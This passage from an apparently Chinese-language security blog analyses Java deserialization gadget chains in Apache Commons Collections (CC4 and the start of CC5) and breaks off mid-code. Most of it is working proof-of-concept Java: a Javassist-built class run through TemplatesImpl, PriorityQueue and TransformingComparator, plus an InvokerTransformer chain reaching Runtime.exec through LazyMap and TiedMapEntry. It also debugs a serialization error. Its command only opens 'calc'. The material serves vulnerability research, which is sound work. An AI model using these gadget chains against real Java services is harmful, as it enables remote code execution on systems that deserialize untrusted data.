class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                         <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-3"><a href="#关键类-3" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>替换InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure><p>CC4 是 CC2+CC3 的变体，by the way，seebug 里面的 poc 我感觉是贴错了 CC2 的</p><p>在 CC2 的利用背景下，改进 PriorityQueue 利用链：因为 CommonsCollections4 除 4.0 的其他版本去掉了 <code>InvokerTransformer</code>的 Serializable 继承，导致无法序列化所以便有了 CC4，CC4 只是将 CC2 中的 <code>InvokerTransformer</code>替换为了<code>InstantiateTransformer</code></p><h3 id="Gadget-3"><a href="#Gadget-3" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;),<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(2,transformingComparator);</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里发现<code>new PriorityQueue(1)</code>后再反射设置了<code>size=2</code>，却并没有触发，有如下报错</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ArrayIndexOutOfBoundsException</span>: <span class="hljs-number">1</span><br>at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.PriorityQueue</span><span class="hljs-selector-class">.writeObject</span>(PriorityQueue<span class="hljs-selector-class">.java</span>:<span class="hljs-number">770</span>)<br>at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span>(Native Method)<br>at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(NativeMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">62</span>)<br>at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(DelegatingMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">43</span>)<br>at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>(Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">497</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectStreamClass</span><span class="hljs-selector-class">.invokeWriteObject</span>(ObjectStreamClass<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1028</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeSerialData</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1496</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeOrdinaryObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1432</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject0</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1178</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">348</span>)<br>at CommonsCollections<span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.main</span>(CC4<span class="hljs-selector-class">.java</span>:<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p>但在 CC2 中提到</p><blockquote><p>PriorityQueue 构造方法为什么传入(1)，也可以传入(1,transformingComparator)后 add 两次，或者反射不传入参数都可以触发</p></blockquote><p>我们注意到 CC2 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>--------------------------------------------------------------------------------------------------------<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                         Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>        <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>        <span class="hljs-keyword">this</span>.comparator = comparator;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        <span class="hljs-comment">// Write out element count, and any hidden stuff</span><br>        s.defaultWriteObject();<br><br>        <span class="hljs-comment">// Write out array length, for compatibility with 1.5 version</span><br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// Write out all elements in the &quot;proper order&quot;.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>是等价于直接<code>new PriorityQueue(2)</code>的，<code>PriorityQueue.queue[2]</code>，序列化时是不会报数组越界的</p><p>CC4 这里<code>initialCapacity</code>设置 1，却没有反射修改<code>queue[]</code>，于是在<code>PriorityQueue.writeObject</code>出现数组越界(为什么通过反射修改<code>size</code>在 CC2 中有说明)，不调试了，直接反射改 queue 数组看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure><p>验证成功</p><h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><h3 id="Pre-4"><a href="#Pre-4" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-4"><a href="#关键类-4" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>CC5 是改造了 CC1，CC1 中<code>LazyMap.get</code>找不到值调用<code>transform</code>方法从而 RCE；CC5 用了<code>TiedMapEntry.toString</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>       <span class="hljs-keyword">super</span>();<br>       <span class="hljs-keyword">this</span>.map = map;<br>       <span class="hljs-keyword">this</span>.key = key;<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> map.get(key);<br>   &#125;<br></code></pre></td></tr></table></figure><p>可见<code>map key</code>均可控，所以此处设置 map 为 CC1 中的<code>LazyMap</code>就能 RCE 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        tiedMapEntry.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>如何去调用<code>TiedMapEntry.toString</code>并且序列化呢，为了不受 jdk 版本限制，CC5 使用了<code>BadAttributeValueExpException</code>类</p><p><a href="https://www.anquanke.com/post/id/190468#h3-3">https://www.anquanke.com/post/id/190468#h3-3</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    ObjectInputStream.GetField gf = ois.readFields();<br>    Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>        val = <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接构造的话会直接触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(tiedMapEntry);<br></code></pre></td></tr></table></figure><p>因此通过反射修改来规避触发</p><h3 id="Gadget-4"><a href="#Gadget-4" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 